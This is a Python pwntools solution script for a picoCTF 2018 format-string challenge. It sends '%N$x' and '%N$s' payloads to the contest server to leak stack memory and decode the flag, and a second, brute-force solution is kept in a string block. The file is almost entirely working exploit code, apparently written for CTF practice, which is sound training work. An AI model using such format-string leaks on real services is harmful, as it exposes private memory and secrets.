# solution 1
from pwn import *

s = remote('2018shell.picoctf.com', 3981)

#encFlag = ''
#stage1 = ' '.join([f'%{i}$x' for i in range(27, 37)])
#print(s.recvuntil('>'), stage1)
#s.sendline(stage1)
#flag1 = s.recvuntil('\n').strip()
#log.info('Flag Part 1: {}'.format(flag1))
#
#stage2 = ' '.join([f'%{i}$x' for i in range(37, 42)])
#print('>', stage2)
#s.sendline(stage2)
#flag2 = s.recvuntil('\n').replace(b'>', b'').strip()
#log.info('Flag Part 2: {}'.format(flag2))
#
#encFlag = flag1 + b' ' + flag2
#log.info('encFlag is: {}'.format(encFlag))
#flag = b''
#for i in encFlag.split(b' '):
#    flag += p32(int(i, 16))
#
#log.info('flag is: {}'.format(flag))
#log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', str(flag))[0])

# Print 16 DWORDs wouldn't work, why?
# Why do we need to split them into 27-37 and then 37-42?
s.recvuntil('> ')
sent_data = ' '.join([f'%{i}$x' for i in range(27, 42)])
s.sendline(sent_data)

encFlag = s.recvuntil('\n').strip()
log.info('encFlag: {}'.format(encFlag))
flag = b''
for i in encFlag.split(b' '):
    flag += p32(int(i, 16))

log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', str(flag))[0])

# solution 2
'''
from pwn import *

for i in range(100):
try:
    sh = remote('2018shell2.picoctf.com', 46960)
    sh.sendlineafter('> ', '%{}$s'.format(i))
    print sh.recvuntil('> ')
    sh.close()
except EOFError:
    pass
'''
